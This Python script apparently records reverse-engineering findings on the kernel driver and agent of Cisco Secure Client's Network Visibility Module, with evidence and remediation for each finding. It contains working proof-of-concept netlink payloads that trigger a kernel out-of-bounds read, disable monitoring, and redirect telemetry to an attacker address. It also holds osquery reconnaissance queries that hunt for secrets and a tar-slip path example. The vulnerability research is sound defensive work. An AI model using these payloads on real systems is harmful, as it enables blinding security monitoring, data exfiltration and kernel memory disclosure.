"""
cisco_secure_client_nvm_re — Cisco Secure Client NVM (Network Visibility Module) RE

Version: 5.1.15.287 (Linux amd64)
Package: cisco-secure-client-nvm_5.1.15.287_amd64.deb

Components analyzed:
  Kernel driver source:  ac_kdf_src.tar.gz -> kdf/lkm/src/
  User-mode agent:       NVM/bin/acnvmagent
  Kernel IPC library:    NVM/lib/libsock_fltr_api.so
  NVM control lib:       libacnvmctrl.so
  eBPF program:          kdf/lkm/src/interceptor.bpf.c
  Bundled osquery:       NVM/bin/osqueryi
  Build script:          NVM/build_ac_ko.sh

Architecture:
  anyconnect_kdf.ko: Linux kernel module (LKM), compiled against running kernel headers.
    - Netfilter hooks (NF_INET_LOCAL_IN + NF_INET_LOCAL_OUT, IPv4+IPv6) intercept all packets.
    - OR eBPF TC programs (csc_tc_prog_ingress/egress) attached to VPN interfaces.
    - Control plane: NETLINK_NVM_USER (protocol 30) netlink socket for user->kernel commands.
    - Data plane: kernel UDP socket sendto(exporter_address) for kernel->user flow telemetry.
  acnvmagent: User-mode daemon that:
    - Sends control commands to kernel module via netlink.
    - Receives network flow telemetry via UDP from kernel module.
    - Uses osqueryi for endpoint telemetry queries.
    - Reports to vpnagentd via csc_nam abstract socket (NvmUserKdfIpc).

Netlink command structure:
  struct nvm_io_ctrl { uint32 command; uint32 plugin_id; uint32 plugin_api_version; uint32 consumer_id; }
  Commands:
    1 = NVM_PLUGIN_COMMAND_ENABLE_APPFLOW  -> payload: struct nvm_info (60 bytes)
    2 = NVM_PLUGIN_COMMAND_DISABLE_APPFLOW -> no payload
    4 = NVM_PLUGIN_COMMAND_SET_FLOW_REPORT_INTERVAL -> payload: uint32_t (4 bytes)
    5 = NVM_PLUGIN_COMMAND_SET_ONE_TIME_FLOW_REPORT_INTERVAL -> payload: uint32_t (4 bytes)

Source files (confirmed):
  netlink_interface.c: netlink recv/bind, NETLINK_NVM_USER=30
  user_cmd_hndl.c: process_userspace_cmd() — dispatch table, NO size validation
  nvm_plugin.c: flow tracking, TCP/UDP state machine, exporter UDP socket
  netfilter_interface.c: nf_hook_ops registration (NF_INET_LOCAL_IN/OUT)
  interceptor.bpf.c: eBPF TC program, ring buffer csc_ringbuf (16MB), BPF maps
  nvm_user_kernel_types.h: shared structs (app_flow, nvm_pid_info, nvm_io_ctrl, etc.)

Findings: NVM-F01 through NVM-F07
"""

import struct
import socket
import os
from pathlib import Path


# ── Finding Registry ─────────────────────────────────────────────────────────

FINDINGS = {
    "NVM-F01": {
        "title": "process_userspace_cmd(): size parameter unused — kernel heap OOB read",
        "severity": "CRITICAL",
        "status": "CONFIRMED",
        "source_file": "kdf/lkm/src/user_cmd_hndl.c:37",
        "description": (
            "process_userspace_cmd(char *pData, size_t size) receives the netlink "
            "payload length in 'size' but never uses it to validate the buffer before "
            "any memcpy. The function immediately does:\n"
            "  memcpy(&command, pData, sizeof(command));\n"
            "Then for NVM_PLUGIN_COMMAND_ENABLE_APPFLOW:\n"
            "  memcpy(&nvm_info, pData + sizeof(nvm_io_ctrl), sizeof(nvm_info));\n"
            "Minimum required: sizeof(nvm_io_ctrl)=16 + sizeof(nvm_info)=60 = 76 bytes.\n"
            "If attacker sends a 4-byte netlink message (command field only), the second "
            "memcpy reads 72 bytes beyond the netlink payload boundary — kernel heap "
            "out-of-bounds read. Combined with NVM-F02 (no privilege check), this is "
            "triggerable by any local user."
        ),
        "evidence": [
            "user_cmd_hndl.c:37: void process_userspace_cmd(char *pData, size_t size)",
            "user_cmd_hndl.c:44: memcpy(&command, pData, sizeof(command));  // no size check",
            "user_cmd_hndl.c:49: memcpy(&nvm_info, (pData + sizeof(struct nvm_io_ctrl)), sizeof(nvm_info));",
            "nvm_user_kernel_types.h:65: sizeof(nvm_io_ctrl) = 4*4 = 16 bytes",
            "nvm_user_kernel_types.h:47: sizeof(nvm_info) = 20+20+2+2+4*4 = 60 bytes",
            "Min required: 76 bytes; 4-byte trigger OOBs by 72 bytes",
        ],
        "impact": (
            "Kernel heap out-of-bounds read: 72 bytes past netlink message boundary. "
            "On SLUB allocator, adjacent kmalloc slab contents disclosed. "
            "May contain kernel pointers, crypto keys, or other slab objects. "
            "Potential KASLR bypass. May also cause kernel panic (KASAN/SMAP violation)."
        ),
        "poc_sketch": (
            "import socket, struct\n"
            "# NETLINK_NVM_USER = 30\n"
            "s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 30)\n"
            "s.bind((0, 0))\n"
            "# NVM_PLUGIN_COMMAND_ENABLE_APPFLOW = 1, send only 4 bytes\n"
            "nl_hdr = struct.pack('IHHII', 4+16+4, 0, 0, 1, 0)  # nlmsghdr\n"
            "payload = struct.pack('I', 1)  # command only, 4 bytes\n"
            "s.send(nl_hdr + payload)  # triggers OOB read of 72 bytes"
        ),
        "remediation": (
            "Add size validation at the top of process_userspace_cmd:\n"
            "  if (size < sizeof(struct nvm_io_ctrl) + payload_size) return;\n"
            "Define minimum sizes per command and validate before any memcpy."
        ),
    },

    "NVM-F02": {
        "title": "NETLINK_NVM_USER socket: no UID or capability check — any local user sends kernel commands",
        "severity": "CRITICAL",
        "status": "CONFIRMED",
        "source_file": "kdf/lkm/src/netlink_interface.c:48",
        "description": (
            "netlink_recv_msg() casts skb->data to struct nlmsghdr and immediately "
            "calls process_userspace_cmd(NLMSG_DATA(nlh), nlh->nlmsg_len) with no "
            "credential check. Absent checks:\n"
            "  - No netlink_capable(skb, CAP_NET_ADMIN)\n"
            "  - No nlmsg_pid check against expected acnvmagent PID\n"
            "  - No sk_uid_cred(skb->sk) comparison\n"
            "The kernel module opens NETLINK_NVM_USER (protocol 30) at module load "
            "via netlink_kernel_create(). Any process that can create AF_NETLINK "
            "SOCK_RAW socket with protocol 30 can send commands. "
            "On Linux, creating NETLINK_NVM_USER socket from user namespaces requires "
            "only CAP_NET_RAW in the user namespace — achievable without root via "
            "'unshare --user --net' on kernels with user namespace support."
        ),
        "evidence": [
            "netlink_interface.c:48: void netlink_recv_msg(struct sk_buff *skb)",
            "netlink_interface.c:52: nlh = (struct nlmsghdr *)skb->data;",
            "netlink_interface.c:58: process_userspace_cmd((char *)NLMSG_DATA(nlh), nlh->nlmsg_len);",
            "No capable()/netlink_capable()/sk_uid_cred() call anywhere in netlink_interface.c",
        ],
        "impact": (
            "Any local user controls the kernel NVM driver: "
            "enable/disable traffic monitoring, redirect flow telemetry (NVM-F03), "
            "trigger OOB read (NVM-F01). "
            "Combined: unprivileged local -> kernel information disclosure."
        ),
        "remediation": (
            "Add to netlink_recv_msg before process_userspace_cmd:\n"
            "  if (!netlink_capable(skb, CAP_NET_ADMIN)) return;\n"
            "OR validate sender PID against registered acnvmagent PID stored at module init."
        ),
    },

    "NVM-F03": {
        "title": "ENABLE_APPFLOW sets arbitrary UDP exporter destination — unprivileged telemetry redirect",
        "severity": "HIGH",
        "status": "CONFIRMED",
        "source_file": "kdf/lkm/src/user_cmd_hndl.c:51",
        "description": (
            "NVM_PLUGIN_COMMAND_ENABLE_APPFLOW (1) takes struct nvm_info from the "
            "netlink payload and sets g_nvm_plugin.exporter_address to any IP:port:\n"
            "  g_nvm_plugin.exporter_address.sin_addr.s_addr = nvm_info.to_local.ipv4.s_addr;\n"
            "  g_nvm_plugin.exporter_address.sin_port = nvm_info.to_local_port;\n"
            "After this, the kernel module calls socket_sendto() with the exporter_address "
            "for every captured network flow (process name, path, src/dst IP:port, bytes). "
            "Any local user (via NVM-F02 + NVM-F01 workaround) can redirect all network "
            "visibility telemetry — including PID, file paths, and full flow metadata — "
            "to an attacker-controlled UDP endpoint."
        ),
        "evidence": [
            "user_cmd_hndl.c:51-55: sets exporter_address from nvm_info.to_local.*",
            "nvm_plugin.c:272: socket_sendto(g_nvm_plugin.pSocket, &exporter_address, data, len)",
            "nvm_user_kernel_types.h:99: struct app_flow (file_name[260], file_path[2048] x2)",
        ],
        "impact": (
            "Full network visibility data exfiltration: all TCP/UDP flows with process "
            "executable paths, PIDs, parent PIDs, src/dst IP:port, byte counts. "
            "Sentinel for security incident response is silenced (no data reaches acnvmagent)."
        ),
        "redirect_poc": (
            "# struct nvm_io_ctrl + struct nvm_info with attacker IP:port\n"
            "cmd = struct.pack('IIII', 1, 0, 1, 0)  # nvm_io_ctrl: ENABLE_APPFLOW\n"
            "attacker_ip = socket.inet_aton('192.168.1.100')\n"
            "# nvm_info: to_remote (20 bytes) + to_local (20 bytes) + ports (4) + reserved (16)\n"
            "nvm_info = bytes(20) + bytes([4]) + bytes(3) + attacker_ip + bytes(12)\n"
            "nvm_info += struct.pack('HH', 0, socket.htons(9999)) + bytes(16)\n"
            "# send via netlink to NETLINK_NVM_USER=30"
        ),
        "remediation": (
            "Validate exporter_address is localhost (127.0.0.1) before accepting. "
            "Do not allow arbitrary IP exporter destinations from user-space. "
            "Apply NVM-F02 fix to prevent unprivileged access."
        ),
    },

    "NVM-F04": {
        "title": "build_ac_ko.sh: root tar extraction with TOCTOU + tar slip risk",
        "severity": "MEDIUM",
        "status": "CANDIDATE",
        "source_file": "NVM/build_ac_ko.sh",
        "description": (
            "build_ac_ko.sh (runs as root) uses mktemp to create a temp directory in /tmp, "
            "copies ac_kdf_src.tar.gz into it, then extracts with 'tar -xvzf'. "
            "Two attack vectors:\n"
            "1. Tar slip: if ac_kdf_src.tar.gz is replaced between cp and tar extraction "
            "   with a crafted tarball containing path traversal entries (e.g., "
            "   '../../etc/cron.d/backdoor'), root extracts attacker-controlled files "
            "   to arbitrary filesystem paths. Race window is the interval between cp and tar.\n"
            "2. Symlink race: TEMPDIR=$( mktemp -d /tmp/lkm.XXXXXX) — if an attacker "
            "   pre-creates symlinks matching the template before mktemp runs (impractical "
            "   but possible on older kernels without fs.protected_symlinks), the cp and "
            "   tar operate on attacker-controlled paths.\n"
            "The tarball source '/opt/cisco/secureclient/NVM/ac_kdf_src.tar.gz' is "
            "owned by root — vector 1 requires prior write access to that path, making "
            "this a post-initial-access privilege persistence technique."
        ),
        "evidence": [
            "build_ac_ko.sh: TEMPDIR=`mktemp -d /tmp/lkm.XXXXXX`",
            "build_ac_ko.sh: cp -af ${KDFSRCTARFILE} ${TEMPDIR} || exit 1",
            "build_ac_ko.sh: tar -xvzf ${KDFSRCTARFILE} || exit 1",
            "No tar --no-absolute-paths, no tarball integrity check before extraction",
        ],
        "impact": (
            "Arbitrary root file write if attacker can modify ac_kdf_src.tar.gz "
            "or race the temp directory creation."
        ),
        "remediation": (
            "Verify tarball integrity (SHA256) before extraction. "
            "Use 'tar --no-absolute-paths --no-unlink' flags. "
            "Extract to a path under /opt/cisco/ (root-owned, not /tmp)."
        ),
    },

    "NVM-F05": {
        "title": "eBPF ring buffer csc_ringbuf: 16MB capture of all VPN interface traffic",
        "severity": "HIGH",
        "status": "CONFIRMED",
        "source_file": "kdf/lkm/src/interceptor.bpf.c",
        "description": (
            "The eBPF TC programs (csc_tc_prog_ingress, csc_tc_prog_egress) attach to "
            "all VPN interfaces tracked in csc_vpn_if_map and capture every packet's "
            "IP+TCP/UDP headers, PID, and process creation time into csc_ringbuf (16MB). "
            "The BPF map csc_vpn_if_map (HASH, 16 entries, key=ifindex) determines "
            "which interfaces are monitored. "
            "The eBPF verbose map csc_userspace_map (ARRAY, 1 entry) is read-writable "
            "from user-space: setting it to 1 enables bpf_printk debug output, leaking "
            "full packet header details to /sys/kernel/debug/tracing/trace_pipe. "
            "The ring buffer contains full flow metadata including process executable paths "
            "for all TCP/UDP sessions on VPN interfaces."
        ),
        "evidence": [
            "interceptor.bpf.c:72: csc_ringbuf BPF_MAP_TYPE_RINGBUF, max_entries=1<<24 (16MB)",
            "interceptor.bpf.c:78: csc_userspace_map BPF_MAP_TYPE_ARRAY (verbose mode toggle)",
            "interceptor.bpf.c:84: csc_vpn_if_map BPF_MAP_TYPE_HASH MAX_VPN_IFACE_ENTRIES=16",
            "interceptor.bpf.c:268: pkt.pid = BPF_CORE_READ(task, tgid)",
            "interceptor.bpf.c:277: process_creation_time = start_time/1000000",
        ],
        "impact": (
            "If ring buffer FD is readable by non-root, all VPN traffic metadata exfiltrated. "
            "Verbose mode toggle via csc_userspace_map leaks to trace_pipe (root-readable)."
        ),
        "remediation": (
            "Pin BPF maps with restrictive permissions (root:root 0600). "
            "Remove debug verbose toggle from production build. "
            "Use BPF_F_MMAPABLE ring buffer only with proper access control."
        ),
    },

    "NVM-F06": {
        "title": "Bundled osqueryi: full SQL query interface to system state",
        "severity": "HIGH",
        "status": "CONFIRMED",
        "source_file": "NVM/bin/osqueryi",
        "description": (
            "Cisco NVM bundles the complete osquery interactive shell at "
            "/opt/cisco/secureclient/NVM/bin/osqueryi (ELF 64-bit, 4.7.10 target). "
            "osqueryi provides SQL access to OS state via virtual tables:\n"
            "  process_envs: all env vars of all processes (may include secrets/tokens)\n"
            "  process_open_files: open file descriptors of all processes\n"
            "  listening_ports: all listening ports and owning PIDs\n"
            "  disk_encryption: full/partial disk encryption state\n"
            "  etc_hosts, etc_passwd: local credential stores\n"
            "  startup_items, crontab: persistence mechanisms\n"
            "If acnvmagent passes user-influenced data to osqueryi SQL queries without "
            "sanitization, SQL injection achieves arbitrary osquery table access. "
            "Even without injection, osqueryi at world-executable permissions is a "
            "reconnaissance tool available to any local user post-initial-access."
        ),
        "evidence": [
            "file NVM/bin/osqueryi -> ELF 64-bit, BuildID 2824d2e6, for GNU/Linux 4.7.10",
            "strings libsock_fltr_api.so -> NvmUserKdfIpc::GetInstance().processNvmData()",
            "NVM/bin/osqueryi executable present in DEB package at world-readable path",
        ],
        "impact": (
            "Information disclosure: process secrets, listening ports, persistence. "
            "Potential SQL injection if acnvmagent passes IPC-supplied data to osquery."
        ),
        "osquery_danger_tables": [
            "process_envs — all environment variables (API keys, tokens, passwords)",
            "process_open_files — open file descriptors",
            "disk_encryption — FileVault/LUKS state",
            "listening_ports — network exposure map",
            "startup_items, crontab — persistence",
            "etc_hosts, etc_passwd — local users and host config",
        ],
        "remediation": (
            "Remove osqueryi binary from production DEB (use osquery daemon instead). "
            "If required, restrict permissions to root:cisco 0700. "
            "Sanitize all input to osquery SQL queries; use parameterized queries."
        ),
    },

    "NVM-F07": {
        "title": "Telemetry exfiltration bypass: any local user can disable NVM monitoring",
        "severity": "MEDIUM",
        "status": "CONFIRMED",
        "source_file": "kdf/lkm/src/user_cmd_hndl.c:57",
        "description": (
            "NVM_PLUGIN_COMMAND_DISABLE_APPFLOW (2) calls nvm_plugin_stop() with no "
            "payload requirement — a 4-byte netlink message (command=2) is sufficient. "
            "Combined with NVM-F02 (no privilege check), any local user can disable "
            "the NVM kernel driver's flow monitoring entirely. "
            "This provides a stealth vector: attacker disables network visibility "
            "before lateral movement, removes traces, re-enables monitoring. "
            "The security operations center loses network telemetry for the window. "
            "Similarly, NVM_PLUGIN_COMMAND_SET_FLOW_REPORT_INTERVAL (4) allows "
            "setting report_interval to an out-of-range value to disable periodic "
            "reporting (nvm_plugin_update_periodic_report_interval sets interval=-1 "
            "if value is out of [60, 360] range)."
        ),
        "evidence": [
            "user_cmd_hndl.c:57: case NVM_PLUGIN_COMMAND_DISABLE_APPFLOW: nvm_plugin_stop()",
            "nvm_plugin.c:1317: if out-of-range: g_nvm_plugin.flow_report_interval = -1",
            "No privilege check before disabling monitoring",
        ],
        "impact": (
            "Security monitoring bypass: attacker disables endpoint network visibility "
            "before attack actions, eliminating the forensic trail. "
            "Silent DoS of NVM telemetry pipeline."
        ),
        "poc": (
            "import socket, struct\n"
            "s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 30)\n"
            "s.bind((0, 0))\n"
            "# NVM_PLUGIN_COMMAND_DISABLE_APPFLOW = 2\n"
            "payload = struct.pack('IIII', 2, 0, 1, 0)  # nvm_io_ctrl with command=2\n"
            "nl_len = 16 + len(payload)  # NLMSG_HDRLEN + payload\n"
            "nl_hdr = struct.pack('IHHII', nl_len, 0, 0, 1, 0)\n"
            "s.send(nl_hdr + payload)  # disables kernel NVM monitoring"
        ),
        "remediation": "Apply NVM-F02 fix (capability check) to block unprivileged disable commands.",
    },
}


# ── Struct Definitions (from nvm_user_kernel_types.h) ─────────────────────────

# All sizes confirmed from source + calculation
SIZES = {
    "nvm_io_ctrl": 16,       # 4x uint32
    "ac_addr": 20,           # uint8 family + 3 pad + union(ipv4=4, ipv6=16 max)
    "nvm_info": 60,          # 2x ac_addr + 2x uint16 + 4x uint32
    "nvm_message_header": 4, # uint16 + uint8 + uint8
    "app_flow": 4740,        # header(4) + sockaddrs(56) + ints + paths(2x260+2x2048+metadata)
    "nvm_pid_info": 4736,    # header + pid + paths
}

NVM_COMMANDS = {
    1: ("NVM_PLUGIN_COMMAND_ENABLE_APPFLOW", SIZES["nvm_io_ctrl"] + SIZES["nvm_info"]),
    2: ("NVM_PLUGIN_COMMAND_DISABLE_APPFLOW", SIZES["nvm_io_ctrl"]),
    4: ("NVM_PLUGIN_COMMAND_SET_FLOW_REPORT_INTERVAL", SIZES["nvm_io_ctrl"] + 4),
    5: ("NVM_PLUGIN_COMMAND_SET_ONE_TIME_FLOW_REPORT_INTERVAL", SIZES["nvm_io_ctrl"] + 4),
}

NVM_MESSAGES = {
    1: "NVM_MESSAGE_APPFLOW_DATA",
    2: "NVM_MESSAGE_PID_INFO",
}

NETLINK_NVM_USER = 30  # from netlink_interface.c:38


# ── PoC Primitives ────────────────────────────────────────────────────────────

def build_netlink_msg(payload: bytes) -> bytes:
    """
    Build a NETLINK_NVM_USER message with the given payload.
    struct nlmsghdr { uint32 len; uint16 type; uint16 flags; uint32 seq; uint32 pid; }
    """
    NLMSG_HDRLEN = 16
    total_len = NLMSG_HDRLEN + len(payload)
    nlmsg_type = 0
    nlmsg_flags = 0
    nlmsg_seq = 1
    nlmsg_pid = os.getpid()
    header = struct.pack("IHHII", total_len, nlmsg_type, nlmsg_flags, nlmsg_seq, nlmsg_pid)
    return header + payload


def build_nvm_io_ctrl(command: int, plugin_id: int = 0,
                       api_version: int = 1, consumer_id: int = 0) -> bytes:
    return struct.pack("IIII", command, plugin_id, api_version, consumer_id)


def oob_read_trigger() -> bytes:
    """
    NVM-F01 PoC: Send only the command field (4 bytes).
    Kernel will memcpy 60 bytes of nvm_info from 72 bytes past the buffer end.
    """
    ctrl = struct.pack("I", 1)  # NVM_PLUGIN_COMMAND_ENABLE_APPFLOW, nothing else
    return build_netlink_msg(ctrl)


def disable_monitoring() -> bytes:
    """
    NVM-F07 PoC: Disable NVM monitoring.
    """
    ctrl = build_nvm_io_ctrl(command=2)
    return build_netlink_msg(ctrl)


def redirect_telemetry(attacker_ip: str, attacker_port: int) -> bytes:
    """
    NVM-F03 PoC: Redirect kernel flow telemetry to attacker-controlled UDP endpoint.
    """
    ctrl = build_nvm_io_ctrl(command=1)

    # struct ac_addr: uint8 family + 3 pad + union{ ipv4(4 bytes), ipv6(16 bytes) }
    # Using IPv4: family=AF_INET=2, then 3 padding bytes, then ipv4 addr, then 12 zero bytes
    def ac_addr_ipv4(ip_str: str) -> bytes:
        family = 2  # AF_INET
        return struct.pack("B", family) + bytes(3) + socket.inet_aton(ip_str) + bytes(12)

    # struct nvm_info:
    #   ac_addr to_remote (20 bytes)
    #   ac_addr to_local  (20 bytes)  <- exporter sets from this field
    #   uint16 to_remote_port (2 bytes)
    #   uint16 to_local_port  (2 bytes)  <- exporter port from this
    #   uint32 reserved1-4 (16 bytes)
    to_remote = bytes(20)  # unused
    to_local = ac_addr_ipv4(attacker_ip)
    to_remote_port = struct.pack("H", 0)
    to_local_port = struct.pack("H", socket.htons(attacker_port))
    reserved = bytes(16)
    nvm_info = to_remote + to_local + to_remote_port + to_local_port + reserved

    return build_netlink_msg(ctrl + nvm_info)


def probe_netlink_socket() -> str:
    """
    Test if NETLINK_NVM_USER (30) socket is accessible.
    Returns "open" if kernel module loaded, "refused" otherwise.
    """
    try:
        s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_NVM_USER)
        s.bind((0, 0))
        s.close()
        return "open"
    except PermissionError:
        return "permission_denied"
    except OSError as e:
        return f"error: {e}"


# ── Osquery Tables Reference ──────────────────────────────────────────────────

OSQUERY_RECON_QUERIES = {
    "secrets_in_env": "SELECT pid, key, value FROM process_envs WHERE key LIKE '%TOKEN%' OR key LIKE '%SECRET%' OR key LIKE '%PASSWORD%' OR key LIKE '%API_KEY%';",
    "listening_ports": "SELECT pid, port, address, protocol FROM listening_ports WHERE address NOT IN ('127.0.0.1', '::1');",
    "disk_encryption": "SELECT name, uuid, encrypted, type, uid FROM disk_encryption;",
    "open_files": "SELECT pid, fd, path FROM process_open_files WHERE path LIKE '/etc/%' OR path LIKE '/root/%' OR path LIKE '%.pem' OR path LIKE '%.key';",
    "crontabs": "SELECT command, path FROM crontab;",
    "startup": "SELECT name, path, source FROM startup_items;",
    "users": "SELECT username, uid, gid, directory, shell FROM users;",
}

OSQUERY_PATH = "/opt/cisco/secureclient/NVM/bin/osqueryi"


# ── Report ────────────────────────────────────────────────────────────────────

def report(verbose: bool = False):
    print("Cisco Secure Client NVM 5.1.15.287 — Kernel Driver RE Findings")
    print("Source: ac_kdf_src.tar.gz (kdf/lkm/src/ — full kernel module source)")
    print("=" * 70)
    for fid, f in FINDINGS.items():
        print(f"[{f['severity']:<8}] [{f['status']:<9}] {fid}: {f['title']}")
        if verbose:
            print(f"          Source:  {f.get('source_file', 'N/A')}")
            print(f"          Impact:  {f['impact']}")
            print()
    print()
    counts = {}
    for f in FINDINGS.values():
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if sev in counts:
            print(f"  {sev}: {counts[sev]}")

    print()
    print("Netlink struct sizes (confirmed from source):")
    for name, size in SIZES.items():
        print(f"  {name}: {size} bytes")
    print()
    print("Command surface:")
    for cmd_id, (name, min_size) in NVM_COMMANDS.items():
        print(f"  {cmd_id}: {name} (min {min_size} bytes)")


if __name__ == "__main__":
    import sys
    verbose = "--verbose" in sys.argv or "-v" in sys.argv
    report(verbose=verbose)

    if "--probe" in sys.argv:
        print(f"\nProbing NETLINK_NVM_USER (30)...")
        result = probe_netlink_socket()
        print(f"  Status: {result}")

    if "--oob" in sys.argv:
        print("\nNVM-F01 OOB trigger message (DO NOT SEND without authorization):")
        msg = oob_read_trigger()
        print(f"  {msg.hex()}")

    if "--disable" in sys.argv:
        print("\nNVM-F07 disable monitoring message:")
        msg = disable_monitoring()
        print(f"  {msg.hex()}")

    if "--osquery" in sys.argv:
        print(f"\nosqueryi path: {OSQUERY_PATH}")
        print("Recon queries:")
        for name, query in OSQUERY_RECON_QUERIES.items():
            print(f"  [{name}] {query[:80]}...")
